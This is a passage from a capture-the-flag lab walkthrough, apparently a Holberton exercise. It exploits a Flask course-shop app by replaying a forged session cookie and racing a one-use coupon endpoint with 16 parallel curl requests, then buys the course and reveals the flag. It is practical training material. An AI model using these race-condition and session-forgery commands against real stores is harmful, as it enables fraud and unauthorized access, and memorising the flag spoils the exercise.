377-                                                                                    </textarea><br>
378-                                                                                    <button type="submit" class="bg_btn bt">
379-                                                                                            Submit Review
380-                                                                                    </button>
--
487-                                                            $100
488-                                                    </div>
489-
490-                                                    <div class="text-center">
491:                                                            <a href="/checkout" class="bg_btn bt">Buy Course</a>
492-                                                    </div>
493-
494-                                                    <div class="cd_social">
495-                                                            <span>Share on:</span>
--
690-                                    </div>
691-
692-                                    <div class="col-xl-5 col-lg-5 align-self-center wow fadeIn">
693-                                            <div class="newsletter">
694:                                                    <form action="#" method="post">
695:                                                            <input type="email" name="EMAIL" placeholder="Email Address">
696-                                                            <button type="submit">Subscribe</button>
697-                                                    </form>
698-                                            </div>
699-                                    </div>
```


🍾 We've found the purchase entry point:

```html
<a href="/checkout" class="bg_btn bt">Buy Course</a>
```

The course costs **$100**. Next, let's see whether our modified `can_buy` permission unlocks checkout and how the coupon is applied.

### **Step 16: Inspect the checkout page**

Run:

```bash
curl -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' http://10.42.178.126/checkout | rg -ni -C 5 'coupon|redeem|discount|balance|checkout|purchase|<form|action=|name=' | sed -n '1,200p'
```

This should help us identify the coupon submission endpoint and its required parameters.


**Command output:**

```html
curl -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' http://10.42.178.126/checkout | rg -ni -C 5 'coupon|redeem|discount|balance|checkout|purchase|<form|action=|name=' | sed -n '1,200p'

3-
4-      <head>
5-              <!-- Meta -->
6-              <meta charset="utf-8">
7-              <meta http-equiv="X-UA-Compatible" content="IE=edge">
8:              <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
9-              <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
10-             <!-- SITE TITLE -->
11-             <title>Register - Holberton</title>
12-             <!-- Latest Bootstrap min CSS -->
13-             <link rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css">
--
96-             <!-- Start Main Banner -->
97-             <section class="main-banner" style="background-image: url(assets/img/bg/banner.jpg);">
98-                     <div class="container">
99-                             <div class="row">
100-                                    <div class="col-xl-12 text-center">
101:                                            <h2>Checkout</h2>
102-                                            <p>
103:                                                    <a href="#">Home</a> <i class='bx bx-chevrons-right'></i> Checkout
104-                                            </p>
105-                                    </div>
106-                            </div>
107-                    </div>
108-                    <div class="blshape">
--

114-                    </div>
115-            </section>
116-            <!-- End Main Banner -->
117-
118:            <!-- Start Checkout -->
119:            <section class="shop checkout section-padding">
120-                    <div class="container">
121-                            <div class="row">
122-
123-                                    <div class="col-8 wow fadeIn">
124-                                            <div class="order-details">
--
127-                                                            <h2>Cart Total</h2>
128-                                                            <div class="content">
129-                                                                    <ul>
130-                                                                            <li>Price<span> $100</span></li>
131-                                                                            <li>
132:                                                                            <form action="/redeem_coupon" method="post">
133:                                                                                    <button type="submit" class="btn btn-primary">Redeem Coupon for $50 Off</button>
134-                                                                            </form>
135-                                                                            </li>
136-                                                                    </ul>
137-                                                            </div>
138-                                                    </div>
139-                                                    <!--/ End Order Widget -->
140-
141-
142-                                                    <!-- Button Widget -->
143-                                                    <div class="single-widget get-button">
144:                                                            <form method="post" action="/buy">
145-                                                                    <button class="bg_btn bt" type="submit"> Buy</button>
146-                                                            </form>
147-                                                    </div>
148-                                                    <!--/ End Button Widget -->
149-                                            </div>
150-                                    </div>
151-                            </div>
152-                    </div>
153-            </section>
154:            <!--/ End Checkout -->
155-
156-            <!-- Start Footer -->
157-            <section class="footer">
158-                    <div class="container">
159-                            <div class="row">
--
162-                                            for Latest Update</h2>
163-                                    </div>
164-
165-                                    <div class="col-xl-5 col-lg-5 align-self-center wow fadeIn">
166-                                            <div class="newsletter">
167:                                                    <form action="#" method="post">
168:                                                            <input type="email" name="EMAIL" placeholder="Email Address">
169-                                                            <button type="submit">Subscribe</button>
170-                                                    </form>
171-                                            </div>
172-                                    </div>
173-                            </div>
```

🎈💥 We now have both endpoints:

- `POST /redeem_coupon`: applies a $50 discount.
- `POST /buy`: attempts to purchase the $100 course.

The key detail is that **redeeming the coupon once would consume it**. We should attempt the race condition now, using several concurrent requests with the same session.

### **Step 17: Race the coupon redemption**

Run this command:

```bash
seq 1 16 | xargs -P 16 -I{} curl -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' -X POST -D /tmp/task3_redeem_{}.headers -o /tmp/task3_redeem_{}.body -c /tmp/task3_redeem_{}.cookies -w 'Request {}: HTTP %{http_code}\n' http://10.42.178.126/redeem_coupon
```

**What it does:**

- Sends 16 coupon-redemption requests concurrently.
- Uses our forged session containing `can_buy=True`.
- Saves each response and its cookies separately for inspection.

The idea is that multiple requests might pass the one-use check before the application records the coupon as redeemed.


**Command output:**

```bash
seq 1 16 | xargs -P 16 -I{} curl -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' -X POST -D /tmp/task3_redeem_{}.headers -o /tmp/task3_redeem_{}.body -c /tmp/task3_redeem_{}.cookies -w 'Request {}: HTTP %{http_code}\n' http://10.42.178.126/redeem_coupon

Request 5: HTTP 200
Request 3: HTTP 200
Request 6: HTTP 200
Request 1: HTTP 200
Request 11: HTTP 200
Request 9: HTTP 200
Request 2: HTTP 200
Request 8: HTTP 200
Request 4: HTTP 200
Request 12: HTTP 200
Request 13: HTTP 200
Request 15: HTTP 200
Request 16: HTTP 200
Request 7: HTTP 200
Request 10: HTTP 200
Request 14: HTTP 200

```

All 16 requests returned HTTP 200. That confirms the server processed them, but **HTTP 200 doesn't tell us whether the coupon was redeemed successfully**.

### **Step 18: Check the redemption results**

Run:

```bash
rg -ni -o '.{0,80}(coupon|redeem|already|success|balance|discount|error).{0,100}' /tmp/task3_redeem_*.body | sed -n '1,100p'
```

This searches the saved responses for messages about successful redemption, reuse limits, and account balances.


**Command output:**

```bash
rg -ni -o '.{0,80}(coupon|redeem|already|success|balance|discount|error).{0,100}' /tmp/task3_redeem_*.body | sed -n '1,100p'

/tmp/task3_redeem_6.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_4.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_12.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_14.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_13.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_2.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_10.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_9.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_1.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_16.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_7.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_5.body:1:Coupon redeemed successfully! New price is $50.
/tmp/task3_redeem_8.body:1:Coupon redeemed successfully! New price is $50.
```

⁉️ **13 of the 16 requests reported successful coupon redemption.** That strongly suggests the one-use restriction is vulnerable to a race condition.

However, every successful response says the new price is **$50**. We need to determine whether the reductions accumulated or whether each request produced a separate session state.

### **Step 19: Inspect the updated session**

Run:

```bash
flask-unsign --decode --cookie "$(awk '$6=="session" {print $7}' /tmp/task3_redeem_1.cookies)"
```

This extracts the session cookie returned by the first redemption request and decodes its contents.


**Command output:**

```bash
flask-unsign --decode --cookie "$(awk '$6=="session" {print $7}' /tmp/task3_redeem_1.cookies)"

# Pressing Ctrl+C to abort because no response was received in a reasonable time.
[!] Aborted.

# listing the files in /tmp to check for the session cookies
┌──(kali㉿kali)-[~]
└─$ ls -lrt /tmp/task3_redeem*
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_5.headers
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_5.body
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_5.cookies
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_3.headers
-rw-rw-r-- 1 kali kali  41 Nov 24 17:15 /tmp/task3_redeem_3.body
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_6.headers
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_3.cookies
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_6.body
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_6.cookies
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_1.headers
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_1.body
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_1.cookies
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_11.headers
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_9.headers
-rw-rw-r-- 1 kali kali  41 Nov 24 17:15 /tmp/task3_redeem_11.body
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_9.body
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_11.cookies
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_9.cookies
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_2.headers
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_2.body
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_8.headers
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_2.cookies
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_8.body
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_4.headers
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_4.body
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_8.cookies
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_4.cookies
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_12.headers
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_12.body
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_13.headers
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_12.cookies
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_13.body
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_15.headers
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_13.cookies
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_16.headers
-rw-rw-r-- 1 kali kali  41 Nov 24 17:15 /tmp/task3_redeem_15.body
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_16.body
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_15.cookies
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_16.cookies
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_7.headers
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_7.body
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_10.headers
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_10.body
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_7.cookies
-rw-rw-r-- 1 kali kali 176 Nov 24 17:15 /tmp/task3_redeem_14.headers
-rw-rw-r-- 1 kali kali  47 Nov 24 17:15 /tmp/task3_redeem_14.body
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_10.cookies
-rw-rw-r-- 1 kali kali 131 Nov 24 17:15 /tmp/task3_redeem_14.cookies
```

The saved cookie files are only 131 bytes, which strongly suggests the redemption endpoint did not issue a new session cookie. That explains why `flask-unsign` waited for input.

Since **13 requests reported successful redemption**, let's test whether the purchase is now possible using our existing forged session.

### **Step 20: Attempt to purchase the course**

Run:

```bash
curl -i -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' -X POST http://10.42.178.126/buy
```

This submits the purchase with `can_buy=True`.


**Command output:**

```html
curl -i -sS -b 'session=eyJ1c2VyX2lkIjoidGFzazNfbGFiXzdjMjkiLCJjYW5fYnV5Ijp0cnVlfQ.awYItg.pwvqLBzylWCbTg4o5MZhGAAk7og' -X POST http://10.42.178.126/buy

HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Tue, 24 Nov 2026 22:27:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3328
Connection: keep-alive
Vary: Cookie

<!DOCTYPE html>
<html lang="en">

        <head>
                <!-- Meta -->
                <meta charset="utf-8">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
                <!-- SITE TITLE -->
                <title>Register - Holberton</title>
                <!-- Latest Bootstrap min CSS -->
                <link rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css">
                <!-- Google Font -->
                <link rel="preconnect" href="https://fonts.googleapis.com">
                <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
                <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;500;600;700&display=swap" rel="stylesheet">
                <!-- Icon CSS -->
                <link rel="stylesheet" href="/static/fonts/themify-icons.css">
                <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
                <link rel="stylesheet" href="assets/css/line-awesome.css">
                <link rel="stylesheet" href="/static/fonts/fontawesome/fontawesome.css">
                <!--- owl carousel Css-->
                <link rel="stylesheet" href="assets/owlcarousel/css/owl.carousel.min.css">
                <link rel="stylesheet" href="/static/owlcarousel/css/owl.theme.default.min.css">
                <!--Preloader Css-->
                <link rel="stylesheet" href="/static/css/preloader.css">
                <!--jquery-simple-mobilemenu Css-->
                <link rel="stylesheet" href="/static/css/jquery-simple-mobilemenu.css">
                <!--magnific-popup Css-->
                <link rel="stylesheet" href="/static/css/magnific-popup.css">
                <!--animate Css-->
                <link rel="stylesheet" href="/static/css/animate.css">
                <!--YouTubePopUp Css-->
                <link rel="stylesheet" href="/static/css/YouTubePopUp.css">
                 <!--Slick Css-->
                <link rel="stylesheet" href="/static/css/slick.css">
                <!--slick theme Css-->
                <link rel="stylesheet" href="/static/css/slick-theme.css">
                <!-- Style CSS -->
                <link rel="stylesheet" href="/static/css/style.css">
                <!-- Responsive CSS -->
                <link rel="stylesheet" href="/static/css/responsive.css">

        </head>

        <body>



                <!-- Start Header -->
                <!-- Start Header -->
                                <!-- Start Header -->
                <header id="navigation">
                        <div class="container-fluid">
                                <div class="row">
                                        <div class="col-30 left-col align-self-center">
                                                <div class="site-logo">
                                                        <a href="index.html"><img style="width:180px" src="/static/img/logo.svg" alt="Holberton"></a>
                                                </div>
                                        </div><!-- End Col -->

                                        <div class="col-40 justify-content-center d-flex align-self-center">
                                                <nav id="main-menu">
                                                        <ul>
                                                                <li class="menu-item">
                                                                        <a href="/">Home</a>
                                                                </li>

                                                                <li class="menu-item">
                                                                        <a href="/courses">Courses</a>
                                                                </li>

                                                                <li>
                                                                        <a href="/blog">Blog</a>
                                                                </li>

                                                                <li>
                                                                        <a href="/contact">Contact</a>
                                                                </li>
                                                        </ul>
                                                </nav>
                                        </div><!-- End Col -->
                                        <div class="col-30 right-col align-self-center text-end">

                                        <li class="nav-item">
                                                                <a class="white-btn bt" href="/logout">Logout</a>
                                        </li>

                                        </div><!-- End Col -->
                                </div>
                        </div>
                </header>
                <!-- END Header -->
                <h2> Congratulation, 611d78f1cf834f909dd9150d8f9632cb</h2>
                </body>
</html>
```

🎈🍾🎉🎇😁&#x20;Task 3 exploited successfully

The application accepted the purchase and revealed the flag:

```
611d78f1cf834f909dd9150d8f9632cb
```

We successfully combined three vulnerabilities:

1. **Registration bypass:** Changed the hidden `registration` parameter from `disabled` to `enabled`.
2. **Session forgery:** Discovered the Flask signing key (`cookie1`) and added `can_buy=True`.
3. **Race condition:** Sent 16 concurrent coupon requests, 13 of which reported successful redemption, allowing the purchase.

### **Step 21: Save the flag**


```bash
echo 611d78f1cf834f909dd9150d8f9632cb > 3-flag.txt
git add .
git commit -m "Task 3 flag"
git push
```

